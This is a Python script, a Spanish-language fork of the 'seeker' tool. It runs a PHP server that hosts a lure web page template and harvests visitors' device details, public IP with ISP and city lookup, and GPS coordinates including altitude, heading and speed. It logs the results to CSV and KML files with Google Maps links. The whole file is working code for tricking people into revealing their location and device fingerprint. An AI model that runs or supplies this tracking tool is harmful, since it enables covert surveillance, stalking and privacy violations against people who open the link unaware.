##!/usr/bin/env python3

VERSION = '1.2.8'

R = '\033[31m'  # rojo
G = '\033[32m'  # verde
C = '\033[36m'  # Azul claro
W = '\033[0m'   # Blanco
Y = '\033[33m'  # Amarillo

import sys
import argparse
import requests
import traceback
from os import path, kill, mkdir
from json import loads, decoder
from packaging import version

parser = argparse.ArgumentParser()
parser.add_argument('-k', '--kml', help='KML filename')
parser.add_argument('-p', '--port', type=int, default=8080, help='Web server port [ Default : 8080 ]')
parser.add_argument('-u', '--update', action='store_true', help='Check for updates')
parser.add_argument('-v', '--version', action='store_true', help='Prints version')

args = parser.parse_args()
kml_fname = args.kml
port = args.port
chk_upd = args.update
print_v = args.version

path_to_script = path.dirname(path.realpath(__file__))

SITE = ''
SERVER_PROC = ''
LOG_DIR = f'{path_to_script}/logs'
DB_DIR = f'{path_to_script}/db'
LOG_FILE = f'{LOG_DIR}/php.log'
DATA_FILE = f'{DB_DIR}/results.csv'
INFO = f'{LOG_DIR}/info.txt'
RESULT = f'{LOG_DIR}/result.txt'
TEMPLATES_JSON = f'{path_to_script}/template/templates.json'
TEMP_KML = f'{path_to_script}/template/sample.kml'
META_FILE = f'{path_to_script}/metadata.json'
META_URL = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/metadata.json'

if not path.isdir(LOG_DIR):
	mkdir(LOG_DIR)

if not path.isdir(DB_DIR):
	mkdir(DB_DIR)

def chk_update():
	try:
		print('> Buscar en Metadata...', end='', flush=True)
		rqst = requests.get(META_URL, timeout=5)
		meta_sc = rqst.status_code
		if meta_sc == 200:
			print('OK')
			metadata = rqst.text
			json_data = loads(metadata)
			gh_version = json_data['version']
			if version.parse(gh_version) > version.parse(VERSION):
				print(f'> Nueva actualizacion disponible : {gh_version}')
			else:
				print('> Ya estas al dia.')
	except Exception as exc:
		print(f'Excepcion : {str(exc)}')


if chk_upd is True:
	chk_update()
	sys.exit()

if print_v is True:
	print(VERSION)
	sys.exit()

import importlib
from csv import writer
from time import sleep
import subprocess as subp
from ipaddress import ip_address
from signal import SIGTERM


def banner():
	with open(META_FILE, 'r') as metadata:
		json_data = loads(metadata.read())
		twitter_url = json_data['twitter']
		comms_url = json_data['comms']

	art = r'''

                        WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXOKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMW0W0WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO;..oKWMMMMMMMMMMMMMMMMMMMMMMMMWOc ..lXMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO,:dc''l0WMMMMMMMMMMMMMMMMMMMMNO: .,oo,cXMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMMMMMK;;ko:ll;,l0WWNK0OkxxxxkkO0XNNOc, :olckd'oNMMMMMMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMMMMWo'xk.  ,ldlcl:'.           ..';;cxo.  c0:,0MMMMMMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMMMMX:,0x.   'c:.                    .','  ;Kd'dMMMMMMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMMMMX;;Kx..',.     ',......             ',.;Kx.dWMMMMMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMMMMNc,OKc;.       :00OkolldOOo.         .;xXo.xMMMMMMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMMMMWx'ox,       .,lOWMMMMMMMMXd:.        .lO;,0MMMMMMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl'.      .;xXWMMMMMMMMMMMMNOl.        ':kNMMMMMMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMMMMWd.       .cONMMMMMMMMMMMMMMMWKd,        .xWMMMMMMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMMMMO'   .. .oKWMMMMMMMMMMMMMMMMMMMWKo'       .OMMMMMMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMMMNc   ,:,lONMMMMMMMMMMMMMMMMMMWXxc,'.        cNMMMMMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMMM0'  .'..:xNMMMW0OXMMMMMMMMWOkd,             ,0MMMMMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMMWx. .,. .dNMMMMWO:cKMMMMMMWx...              .dWMMMMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMMN:  ;k;.xWMMWKOOxxx0MMMMMMO'                  ,KMMMMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMM0'  oKloNWKNWOlc;,kWMMMMMWo   .;'   ..        .xWMMMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMMx.  oNKXMKdOWMXko;lXMMMMWK;         ;;         :XMMMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMWo   oWMMMXl;0MMMMNXWMMMNXo.        ;x,         .OMMMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMNc   cNMMMWXxdKWMMMMMMMMNKc        ':'          .dWMMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMX;   :XMMMMMMNXWMMMMMMMMNXl        .             :XMMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMK,   '0MMMMMMMMMMMMMMMMMWNo             ..       '0MMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMM0'   .oWMMMMMMMMMMMMMNKOOOc.         .;:,.       .kMMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMO.    cNMMMMMMWKKWMMXc.              .'.          dWMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMk.    .OMMMMMMWkcOMMK;     .                      lNMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMk.     :XMMMMMMNllXMWOc.                          :XMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMk.     .oNMMMMMWx.'clol,....                      ;KMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMk.      .l0XMMMMXc   .;lllc,.                     ,0MMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMk.        .:KMMMMK;                               ,KMMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMx.          ,OWMMW0;                            .cOKNMMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMMMMXl.          .c0WMMK;                         .ckx:.cKMMMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMMWKddkkl'          .cddOk,                      .;ll,    'xNMMMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMMMNd.   .,;,.        .',.'cc'        .           ...        .:OWMMMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMMMMNk;                   .;dkd:'.   .:xx;                        .:0WMMMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMMMWXx,                       .c0Xkc;:lONXc                           .cOWMMMMMMMMMMMMMW
                        WMMMMMMMMMMMMMW0l.             .........     .cKWWWMMX:             .                .c0WMMMMMMMMMMMW
                        WMMMMMMMMMMWKd;.                               'kWMMK:                                 .cOWMMMMMMMMMW
                        WMMMMMMMMW0c.                                  '0MXc                                    .c0WMMMMMMMW
                        WMMMMMMMWx.                                      cOl.                                      .lKMMMMMMW
                        WMMMMMMWx.                                       ...                                         ,OWMMMMW
                        WMMMMMM0,                                         ..                                          ,0MMMMW
                        WMMMMMNl                                          .,.                                          :XMMMW
                        NWWWWW0,                                          .::                                          .xNWNN

          :::    :::::::::::   :::::::::::           :::        ::::::::       :::    :::      :::       :::       ::::::::       :::        ::::::::::
       :+: :+:      :+:           :+:             :+: :+:     :+:    :+:      :+:   :+:       :+:       :+:      :+:    :+:      :+:        :+:
     +:+   +:+     +:+           +:+            +:+   +:+    +:+             +:+  +:+        +:+       +:+      +:+    +:+      +:+        +:+
   +#++:++#++:    +#+           +#+           +#++:++#++:   +#+             +#++:++         +#+  +:+  +#+      +#+    +:+      +#+        :#::+::#
  +#+     +#+    +#+           +#+           +#+     +#+   +#+             +#+  +#+        +#+ +#+#+ +#+      +#+    +#+      +#+        +#+
 #+#     #+#    #+#           #+#           #+#     #+#   #+#    #+#      #+#   #+#        #+#+# #+#+#       #+#    #+#      #+#        #+#
###     ###    ###           ###           ###     ###    ########       ###    ###        ###   ###         ########       ########## ###'''

	print(f'{G}{art}{W}\n')
	print(f'{G}[>] {C}Creado por  : {W}Carlos Arturo Alonso Beltrán\nCristopher Ricardo Reyes Lopez\nAlvaro Jesus Zermeno Guzman\nDaniel Flores de la Torre\nIan Axel Santoyo Rodríguez\nEduardo Salinas Garcia ')
	print(f'{G} |---> {C}Twitter   : {W}{twitter_url}')
	print(f'{G} |---> {C}Community : {W}{comms_url}')
	print(f'{G}[>] {C}Version      : {W}{VERSION}\n')


def template_select(site):
	print(f'{Y}[!] Selecciona una plantilla :{W}\n')

	with open(TEMPLATES_JSON, 'r') as templ:
		templ_info = templ.read()

	templ_json = loads(templ_info)

	for item in templ_json['templates']: #Esto no#
		name = item['name'] #Esto no#
		print(f'{G}[{templ_json["templates"].index(item)}] {C}{name}{W}') #Esto no#

	try:
		selected = int(input(f'{G}[>] {W}'))
		if selected < 0:
			print()
			print(f'{R}[-] {C}Entrada invalida!{W}')
			sys.exit()
	except ValueError:
		print()
		print(f'{R}[-] {C}Entrada invalida!{W}')
		sys.exit()

	try:
		site = templ_json['templates'][selected]['dir_name']
	except IndexError:
		print()
		print(f'{R}[-] {C}Entrada invalida!{W}')
		sys.exit()

	print()
	print(f'{G}[+] {C}Iniciando {Y}{templ_json["templates"][selected]["name"]} {C}plantilla...{W}')

	module = templ_json['templates'][selected]['module']
	if module is True:
		imp_file = templ_json['templates'][selected]['import_file']
		importlib.import_module(f'template.{imp_file}')
	else:
		pass
	return site


def server():
	print()
	preoc = False
	print(f'{G}[+] {C}Puerto : {W}{port}\n')
	print(f'{G}[+] {C}Iniciando PHP Servidor...{W}', end='', flush=True)
	cmd = ['php', '-S', f'0.0.0.0:{port}', '-t', f'template/{SITE}/']

	with open(LOG_FILE, 'w+') as phplog:
		proc = subp.Popen(cmd, stdout=phplog, stderr=phplog)
		sleep(3)
		phplog.seek(0)
		if 'Address already in use' in phplog.readline(): #ESTO NOOO
			preoc = True
		try:
			php_rqst = requests.get(f'http://127.0.0.1:{port}/index.html')
			php_sc = php_rqst.status_code
			if php_sc == 200:
				if preoc:
					print(f'{C}[ {G}✔{C} ]{W}')
					print(f'{Y}[!] El servidor ya esta en funcionamiento!{W}')
					print()
				else:
					print(f'{C}[ {G}✔{C} ]{W}')
					print()
			else:
				print(f'{C}[ {R}Estado : {php_sc}{C} ]{W}')
				cl_quit(proc)
		except requests.ConnectionError:
			print(f'{C}[ {R}✘{C} ]{W}')
			cl_quit(proc)
	return proc


def wait():
	printed = False
	while True:
		sleep(2)
		size = path.getsize(RESULT)
		if size == 0 and printed is False:
			print(f'{G}[+] {C}Esperando al cliente...{Y}[ctrl+c to exit]{W}\n')
			printed = True
		if size > 0:
			data_parser()
			printed = False


def data_parser():
	data_row = []
	with open(INFO, 'r') as info_file:
		info_file = info_file.read()
	try:
		info_json = loads(info_file)
	except decoder.JSONDecodeError:
		print(f'{R}[-] {C}Excepcion : {R}{traceback.format_exc()}{W}')
	else:
		var_os = info_json['os']
		var_platform = info_json['platform']
		var_cores = info_json['cores']
		var_ram = info_json['ram']
		var_vendor = info_json['vendor']
		var_render = info_json['render']
		var_res = info_json['wd'] + 'x' + info_json['ht']
		var_browser = info_json['browser']
		var_ip = info_json['ip']

		data_row.extend([var_os, var_platform, var_cores, var_ram, var_vendor, var_render, var_res, var_browser, var_ip])

		print(f'''{Y}[!] Informacion del dispositivo :{W}

{G}[+] {C}OS         : {W}{var_os}
{G}[+] {C}Plataforma   : {W}{var_platform}
{G}[+] {C}CPU Cores  : {W}{var_cores}
{G}[+] {C}RAM        : {W}{var_ram}
{G}[+] {C}GPU Distribuidor : {W}{var_vendor}
{G}[+] {C}GPU        : {W}{var_render}
{G}[+] {C}Resolucion : {W}{var_res}
{G}[+] {C}Navegador    : {W}{var_browser}
{G}[+] {C}IP publica  : {W}{var_ip}
''')

		if ip_address(var_ip).is_private:
			print(f'{Y}[!] Omision del reconocimiento de IP porque la direccion IP es privada{W}')
		else:
			rqst = requests.get(f'https://ipwhois.app/json/{var_ip}')
			s_code = rqst.status_code

			if s_code == 200:
				data = rqst.text
				data = loads(data)
				var_continent = str(data['continent']) #Esto no
				var_country = str(data['country'])     #
				var_region = str(data['region'])       #
				var_city = str(data['city'])           #
				var_org = str(data['org'])             #
				var_isp = str(data['isp'])             #

				data_row.extend([var_continent, var_country, var_region, var_city, var_org, var_isp])

				print(f'''{Y}[!] Informacion de IP :{W}

{G}[+] {C}Continente : {W}{var_continent}
{G}[+] {C}Pais   : {W}{var_country}
{G}[+] {C}Region    : {W}{var_region}
{G}[+] {C}Ciudad      : {W}{var_city}
{G}[+] {C}Org       : {W}{var_org}
{G}[+] {C}ISP       : {W}{var_isp}
''') #ISP provedor de servicio de internet

	with open(RESULT, 'r') as result_file:
		results = result_file.read()
		try:
			result_json = loads(results)
		except decoder.JSONDecodeError:
			print(f'{R}[-] {C}Excepcion : {R}{traceback.format_exc()}{W}')
		else:
			status = result_json['status']    #Esto no
			if status == 'success':           #
				var_lat = result_json['lat']  #
				var_lon = result_json['lon']  #
				var_acc = result_json['acc']  #
				var_alt = result_json['alt']  #
				var_dir = result_json['dir']  #
				var_spd = result_json['spd']  #

				data_row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd])

				print(f'''{Y}[!] Informacion de localizacion :{W}

{G}[+] {C}Latitud  : {W}{var_lat}
{G}[+] {C}Longitud : {W}{var_lon}
{G}[+] {C}Precision  : {W}{var_acc}
{G}[+] {C}Altitud  : {W}{var_alt}
{G}[+] {C}Direccion : {W}{var_dir}
{G}[+] {C}Velocidad      : {W}{var_spd}
''')

				print(f'{G}[+] {C}Google Maps : {W}https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}')

				if kml_fname is not None:
					kmlout(var_lat, var_lon)
			else:
				var_err = result_json['error']
				print(f'{R}[-] {C}{var_err}\n')

	csvout(data_row)
	clear()
	return


def kmlout(var_lat, var_lon):
	with open(TEMP_KML, 'r') as kml_sample:
		kml_sample_data = kml_sample.read()

	kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
	kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))

	with open(f'{path_to_script}/{kml_fname}.kml', 'w') as kml_gen:
		kml_gen.write(kml_sample_data)

	print(f'{Y}[!] Archivo KML Generado!{W}')
	print(f'{G}[+] {C}Ruta : {W}{path_to_script}/{kml_fname}.kml')


def csvout(row):
	with open(DATA_FILE, 'a') as csvfile:
		csvwriter = writer(csvfile)
		csvwriter.writerow(row)
	print(f'{G}[+] {C}Datos guardados : {W}{path_to_script}/db/results.csv\n')


def clear():
	with open(RESULT, 'w+'):
		pass
	with open(INFO, 'w+'):
		pass


def repeat():
	clear()
	wait()


def cl_quit(proc):
	clear()
	if proc:
		kill(proc.pid, SIGTERM)
	sys.exit()


try:
	banner()
	clear()
	SITE = template_select(SITE)
	SERVER_PROC = server()
	wait()
	data_parser()
except KeyboardInterrupt:
	print(f'{R}[-] {C}Interrupcion del teclado.{W}')
	cl_quit(SERVER_PROC)
else:
	repeat()
